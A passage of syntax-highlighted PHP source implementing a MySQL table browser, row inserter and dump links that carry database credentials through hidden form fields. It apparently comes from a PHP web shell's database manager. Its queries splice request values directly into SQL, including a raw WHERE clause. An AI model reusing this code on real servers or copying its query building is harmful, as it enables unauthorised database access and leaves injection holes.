     <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$tbl_struct_result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tbl_struct_fields</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_ls</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$sql_le</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_le</span> <span class="o">=</span> <span class="nv">$sql_ls</span> <span class="o">+</span> <span class="nv">$perpage</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_page</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;}</span>
     <span class="nv">$perpage</span> <span class="o">=</span> <span class="nv">$sql_tbl_le</span> <span class="o">-</span> <span class="nv">$sql_tbl_ls</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$perpage</span><span class="p">))</span> <span class="p">{</span><span class="nv">$perpage</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
     <span class="nv">$numpages</span> <span class="o">=</span> <span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="nv">$perpage</span><span class="p">;</span>
     <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$sql_order</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;DESC&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;ASC&quot;</span><span class="p">;}</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;ORDER BY `&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$asc_desc</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
     <span class="p">}</span>
     <span class="k">else</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
     <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;LIMIT &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot; , &quot;</span><span class="o">.</span><span class="nv">$perpage</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Table &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; cols and &quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; rows)&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_act.value=&#39;structure&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Structure&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_act.value=&#39;browse&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Browse&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;tbldump&#39;;document.sql.thistbl.value=&#39;1&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Dump&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_act.value=&#39;insert&#39;;document.sql.thistbl.value=&#39;1&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Insert&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;structure&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Coming sooon!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_insert</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span><span class="p">))</span>
      <span class="p">{</span>

      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Inserting row into table:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
        <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; WHERE&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="p">;</span>
        <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
        <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">);</span>
        <span class="nv">$sql_tbl_insert_q</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">);</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
        <span class="nv">$values</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
       <span class="p">}</span>
       <span class="k">else</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=&#39;sql_tbl_act&#39; value=&#39;insert&#39;&amp;gt;&amp;lt;input type=hidden name=&#39;sql_tbl_insert_q&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=&#39;sql_tbl_ls&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=&#39;sql_tbl_le&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=sql_tbl value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2"> bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Field&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Function&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>

       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct_fields</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span>
       <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_functs[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PASSWORD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;MD5&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ENCRYPT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ASCII&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CHAR&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;RAND&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LAST_INSERT_ID&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;COUNT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;AVG&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SUM&amp;lt;/option&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;--------&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SOUNDEX&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;NOW&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURDATE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_UNIXTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_ADD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_DIFF&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;TO_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UNIX_TIMESTAMP&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;USER&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;WEEKDAY&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CONCAT&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=50&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;Insert as new row&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; or &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;b&amp;gt;Save&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_q</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;browse&quot;</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">);</span>
      <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
      <span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numpages</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
      <span class="p">{</span>
